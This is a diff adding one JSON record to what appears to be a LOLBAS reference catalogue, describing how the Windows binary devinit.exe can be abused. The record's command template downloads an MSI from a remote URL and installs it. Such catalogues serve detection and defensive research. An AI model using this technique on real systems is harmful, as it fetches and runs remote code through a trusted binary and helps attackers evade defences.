@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-devinit-exe-execute",
+  "name": "LOLBAS · Devinit.exe (Execute)",
+  "command": "devinit.exe run -t msi-install -i {REMOTEURL:.msi}",
+  "description": "Downloads an MSI file to C:\\Windows\\Installer and then installs it.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "devinit",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Devinit/",
+  "upstream_id": "Devinit.exe/Execute/0",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — Devinit.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Devinit/"
+    }
+  ]
+}
